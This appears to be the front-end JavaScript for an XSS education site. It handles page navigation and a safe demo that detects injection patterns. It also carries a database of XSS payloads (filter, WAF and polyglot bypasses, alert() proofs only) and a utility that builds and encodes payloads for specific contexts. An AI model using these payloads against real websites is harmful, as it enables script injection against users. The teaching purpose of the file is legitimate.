/* XSS Documentation Interactive Features */

// Type declarations for window properties
/**
 * @typedef {Object} DocsManager
 * @property {function} previousSection
 * @property {function} nextSection
 * @property {function} setupIntersectionObserver
 */

// Extend window object
window.docsManager = window.docsManager || null;

class DocsManager {
  constructor() {
    this.currentSection = 0;
    this.sections = [];
    this.typingStrings = [
      '<script>alert("XSS");</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(document.domain)',
      '"><script>alert("Bypassed!");</script>',
      '\');alert(String.fromCharCode(88,83,83));//'
    ];
    this.currentStringIndex = 0;

    this.init();
  }

  init() {
    this.setupScrollProgress();
    this.setupSmoothScrolling();
    this.setupCodeHighlighting();
    this.startHeroAnimation();
    this.setupInteractiveDemo();
    this.setupContextTabs();
    this.initSections();
  }

  // Reading Progress Bar
  setupScrollProgress() {
    const progressBar = document.getElementById('readingProgress');
    if (!progressBar) return;

    window.addEventListener('scroll', () => {
      const scrollTop = window.pageYOffset;
      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
      const scrollPercent = (scrollTop / docHeight) * 100;
      progressBar.style.width = Math.min(scrollPercent, 100) + '%';
    });
  }

  // Smooth Scrolling Navigation
  setupSmoothScrolling() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const targetId = this.getAttribute('href').substring(1);
        const targetElement = document.getElementById(targetId);

        if (targetElement) {
          targetElement.scrollIntoView({
            behavior: 'smooth',
            block: 'start'
          });

          // Update active nav link
          document.querySelectorAll('.nav-link').forEach(link => {
            link.classList.remove('active');
          });
          this.classList.add('active');
        }
      });
    });
  }

  // Code Syntax Highlighting
  setupCodeHighlighting() {
    if (typeof hljs !== 'undefined') {
      hljs.highlightAll();
    }
  }

  // Hero Typing Animation
  startHeroAnimation() {
    const typedTextElement = document.getElementById('typedText');
    if (!typedTextElement) return;

    this.typeString(typedTextElement, this.typingStrings[0], () => {
      setTimeout(() => {
        this.cycleTypingStrings(typedTextElement);
      }, 2000);
    });
  }

  typeString(element, text, callback) {
    element.textContent = '';
    let i = 0;

    const typeChar = () => {
      if (i < text.length) {
        element.textContent += text.charAt(i);
        i++;
        setTimeout(typeChar, 100);
      } else if (callback) {
        callback();
      }
    };

    typeChar();
  }

  eraseString(element, callback) {
    const text = element.textContent;
    let i = text.length;

    const eraseChar = () => {
      if (i > 0) {
        element.textContent = text.substring(0, i - 1);
        i--;
        setTimeout(eraseChar, 50);
      } else if (callback) {
        callback();
      }
    };

    eraseChar();
  }

  cycleTypingStrings(element) {
    this.eraseString(element, () => {
      this.currentStringIndex = (this.currentStringIndex + 1) % this.typingStrings.length;
      setTimeout(() => {
        this.typeString(element, this.typingStrings[this.currentStringIndex], () => {
          setTimeout(() => {
            this.cycleTypingStrings(element);
          }, 3000);
        });
      }, 500);
    });
  }

  // Interactive XSS Demo
  setupInteractiveDemo() {
    window.simulateXSS = () => {
      const userInput = document.getElementById('userInput');
      const demoOutput = document.getElementById('demoOutput');

      if (!userInput || !demoOutput) return;

      const input = userInput.value;

      // Simulate different XSS scenarios safely
      if (input.toLowerCase().includes('<script>')) {
        demoOutput.innerHTML = `
          <div style="color: #dc3545; font-weight: bold;">
            🚨 XSS DETECTED! Script tag injection attempt
          </div>
          <div style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 0.5rem;">
            In a real application, this would execute: ${this.escapeHtml(input)}
          </div>
        `;
        this.flashDemo('danger');
      } else if (input.toLowerCase().includes('onerror')) {
        demoOutput.innerHTML = `
          <div style="color: #ffc107; font-weight: bold;">
            ⚠️ Event Handler Injection Detected!
          </div>
          <div style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 0.5rem;">
            Detected event handler: ${this.escapeHtml(input)}
          </div>
        `;
        this.flashDemo('warning');
      } else if (input.toLowerCase().includes('javascript:')) {
        demoOutput.innerHTML = `
          <div style="color: #17a2b8; font-weight: bold;">
            🔗 JavaScript URL Scheme Detected!
          </div>
          <div style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 0.5rem;">
            URL scheme injection: ${this.escapeHtml(input)}
          </div>
        `;
        this.flashDemo('info');
      } else if (input.includes('<') || input.includes('>')) {
        demoOutput.innerHTML = `
          <div style="color: var(--neon-cyan); font-weight: bold;">
            🏷️ HTML Tag Detected!
          </div>
          <div style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 0.5rem;">
            Potential HTML injection: ${this.escapeHtml(input)}
          </div>
        `;
        this.flashDemo('info');
      } else {
        demoOutput.innerHTML = `
          <div style="color: var(--neon-green); font-weight: bold;">
            ✅ Safe Input
          </div>
          <div style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 0.5rem;">
            Welcome ${this.escapeHtml(input)}! No XSS patterns detected.
          </div>
        `;
        this.flashDemo('success');
      }
    };
  }

  flashDemo(type) {
    const demoContainer = document.querySelector('.xss-demo');
    if (!demoContainer) return;

    const colors = {
      danger: '#dc3545',
      warning: '#ffc107',
      info: '#17a2b8',
      success: '#28a745'
    };

    demoContainer.style.borderColor = colors[type];
    demoContainer.style.boxShadow = `0 0 20px ${colors[type]}40`;

    setTimeout(() => {
      demoContainer.style.borderColor = 'var(--border-color)';
      demoContainer.style.boxShadow = 'none';
    }, 2000);
  }

  escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  // Context Tabs System
  setupContextTabs() {
    window.showContext = (contextName) => {
      // Hide all context panels
      document.querySelectorAll('.context-panel').forEach(panel => {
        panel.classList.remove('active');
      });

      // Remove active class from all buttons
      document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
      });

      // Show selected context panel
      const selectedPanel = document.getElementById(`${contextName}-context`);
      if (selectedPanel) {
        selectedPanel.classList.add('active');
      }

      // Add active class to selected button
      if (event && event.target) {
        event.target.classList.add('active');
      }
    };
  }

  // Copy Code Functionality
  setupCodeCopying() {
    window.copyCode = (button) => {
      const codeBlock = button.parentElement.nextElementSibling.querySelector('code');
      if (codeBlock) {
        const text = codeBlock.textContent;

        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(text).then(() => {
            const originalText = button.innerHTML;
            button.innerHTML = '<i class="fas fa-check"></i>';
            button.style.color = 'var(--neon-green)';

            setTimeout(() => {
              button.innerHTML = originalText;
              button.style.color = '';
            }, 2000);
          }).catch(err => {
            console.error('Failed to copy code:', err);
            this.fallbackCopyText(text, button);
          });
        } else {
          this.fallbackCopyText(text, button);
        }
      }
    };
  }

  // Fallback copy method for HTTP or unsupported browsers
  fallbackCopyText(text, button) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();

    try {
      const successful = document.execCommand('copy');
      if (successful) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i>';
        button.style.color = 'var(--neon-green)';

        setTimeout(() => {
          button.innerHTML = originalText;
          button.style.color = '';
        }, 2000);
      }
    } catch (err) {
      console.error('Fallback copy failed:', err);
    } finally {
      document.body.removeChild(textArea);
    }
  }

  // Section Navigation
  initSections() {
    this.sections = Array.from(document.querySelectorAll('.doc-section')).map(section => section.id);
    this.setupCodeCopying();
  }

  previousSection() {
    if (this.currentSection > 0) {
      this.currentSection--;
      this.scrollToSection(this.sections[this.currentSection]);
    }
  }

  nextSection() {
    if (this.currentSection < this.sections.length - 1) {
      this.currentSection++;
      this.scrollToSection(this.sections[this.currentSection]);
    }
  }

  scrollToSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section) {
      section.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }

  // Intersection Observer for Auto-highlighting Navigation
  setupIntersectionObserver() {
    const observerOptions = {
      root: null,
      rootMargin: '-50px 0px -50px 0px',
      threshold: 0.1
    };

    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          // Update active navigation link
          const navLink = document.querySelector(`a[href="#${entry.target.id}"]`);
          if (navLink) {
            document.querySelectorAll('.nav-link').forEach(link => {
              link.classList.remove('active');
            });
            navLink.classList.add('active');
          }
        }
      });
    }, observerOptions);

    // Observe all sections
    document.querySelectorAll('.doc-section, .subsection').forEach(section => {
      observer.observe(section);
    });
  }
}

// Advanced XSS Examples Database
const XSSExamples = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>'
  ],

  bypasses: [
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    '<img src=x onerror="alert`1`">',
    '<svg><script>alert(1)</script></svg>',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'
  ],

  polyglot: [
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
    '\'"()&%<acx><ScRiPt >alert(String.fromCharCode(88,83,83))</ScRiPt>',
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\'>'
  ],

  wafBypass: [
    '<script>window["ale"+"rt"](1)</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<svg><animate onbegin=alert(1) attributeName=x></svg>',
    '<script>Function("ale"+"rt(1)")()</script>',
    '<iframe srcdoc="<script>parent.alert(1)</script>">'
  ],

  // Advanced research techniques from Sam Anttila
  advancedResearch: [
    '<img\\fsrc=x\\fonerror=alert(1)>', // Form feed separator
    '<img\\rsrc=x\\ronerror=alert(1)>', // Carriage return separator
    '<img src=x OnErRoR=alert(1)>', // Case sensitivity bypass
    '<svg ONlOaD=alert(1)>', // Mixed case event handler
    '<video onloadstart=alert(1)>', // HTML5 event handler
    '<audio oncanplay=alert(1)>', // Modern media event
    '<details onbeforetoggle=alert(1) open>', // Experimental event
    '{{constructor.constructor(\'alert(1)\')()}}', // AngularJS template injection
    '<img src=x onerror=eval(atob(\'YWxlcnQoMSk=\'))>', // Double-encoding bypass
    '<iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">' // HTML entity srcdoc
  ]
};

// Global Navigation Functions
window.previousSection = () => {
  if (window.docsManager) {
    window.docsManager.previousSection();
  }
};

window.nextSection = () => {
  if (window.docsManager) {
    window.docsManager.nextSection();
  }
};

// Dynamic Payload Counter
class PayloadCounter {
  constructor() {
    this.loadPayloadCount();
  }

  async loadPayloadCount() {
    try {
      const response = await fetch('data/payloads.yaml?v=' + Date.now(), {
        cache: 'no-cache'
      });
      const yamlText = await response.text();

      // Count payload entries dynamically
      const payloadMatches = yamlText.match(/^\s*- code: \|/gm);
      const payloadCount = payloadMatches ? payloadMatches.length : 0;

      this.updatePayloadCount(payloadCount);
    } catch (error) {
      console.warn('Failed to load payload count:', error);
      // Show error state if loading fails
      this.updatePayloadCountError();
    }
  }

  updatePayloadCount(count) {
    // Update main description count
    const countElement = document.getElementById('dynamicPayloadCount');
    if (countElement) {
      countElement.textContent = count > 0 ? `${count}` : 'many';
      countElement.style.color = 'var(--neon-green)';
      countElement.style.fontWeight = '600';
    }

    // Update payload link count
    const linkCountElement = document.getElementById('payloadLinkCount');
    if (linkCountElement) {
      linkCountElement.textContent = count > 0 ? `${count}` : 'many';
      linkCountElement.style.color = 'var(--neon-cyan)';
      linkCountElement.style.fontWeight = '600';
    }
  }

  updatePayloadCountError() {
    // Update main description count
    const countElement = document.getElementById('dynamicPayloadCount');
    if (countElement) {
      countElement.textContent = 'many';
      countElement.style.color = 'var(--neon-green)';
      countElement.style.fontWeight = '600';
    }

    // Update payload link count
    const linkCountElement = document.getElementById('payloadLinkCount');
    if (linkCountElement) {
      linkCountElement.textContent = 'many';
      linkCountElement.style.color = 'var(--neon-cyan)';
      linkCountElement.style.fontWeight = '600';
    }
  }
}

// Initialize Documentation Manager
document.addEventListener('DOMContentLoaded', () => {
  window.docsManager = new DocsManager();

  // Initialize payload counter
  new PayloadCounter();

  // Setup intersection observer after a short delay
  setTimeout(() => {
    window.docsManager.setupIntersectionObserver();
  }, 1000);

  // Add keyboard navigation
  document.addEventListener('keydown', (e) => {
    if (e.ctrlKey || e.metaKey) return;

    switch(e.key) {
      case 'ArrowLeft':
        if (window.docsManager) {
          window.docsManager.previousSection();
        }
        break;
      case 'ArrowRight':
        if (window.docsManager) {
          window.docsManager.nextSection();
        }
        break;
    }
  });
});

// Advanced XSS Testing Utilities
const XSSUtils = {
  // Generate context-specific payloads
  generatePayload: (context, restrictions = {}) => {
    const payloads = {
      html: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
      attribute: ['" onmouseover="alert(1)', '\' onmouseover=alert(1) \''],
      javascript: ['\';alert(1);//', '\');alert(1);//'],
      css: ['</style><script>alert(1)</script>', 'expression(alert(1))'],
      url: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']
    };

    let contextPayloads = payloads[context] || payloads.html;

    // Apply restrictions
    if (restrictions.noAngles) {
      contextPayloads = contextPayloads.filter(p => !p.includes('<') && !p.includes('>'));
    }

    if (restrictions.noQuotes) {
      contextPayloads = contextPayloads.filter(p => !p.includes('"') && !p.includes("'"));
    }

    if (restrictions.noParentheses) {
      contextPayloads = contextPayloads.filter(p => !p.includes('(') && !p.includes(')'));
    }

    return contextPayloads[Math.floor(Math.random() * contextPayloads.length)];
  },

  // Encode payload for different contexts
  encodePayload: (payload, encoding) => {
    switch(encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
      case 'unicode':
        return payload.split('').map(char =>
          char.charCodeAt(0) > 127 ?
          `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}` : char
        ).join('');
      case 'hex':
        return payload.split('').map(char =>
          `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`
        ).join('');
      default:
        return payload;
    }
  },

  // Analyze XSS payload characteristics
  analyzePayload: (payload) => {
    return {
      length: payload.length,
      hasScriptTag: payload.toLowerCase().includes('<script>'),
      hasEventHandler: /on\w+\s*=/.test(payload.toLowerCase()),
      hasJavascriptScheme: payload.toLowerCase().includes('javascript:'),
      complexity: payload.length > 50 ? 'high' : payload.length > 20 ? 'medium' : 'low',
      bypassTechniques: {
        caseVariation: /[A-Z]/.test(payload) && /[a-z]/.test(payload),
        encoding: /\\x|\\u|%[0-9a-f]{2}/i.test(payload),
        concatenation: /\+|concat/.test(payload),
        evaluation: /eval|function/i.test(payload)
      }
    };
  }
};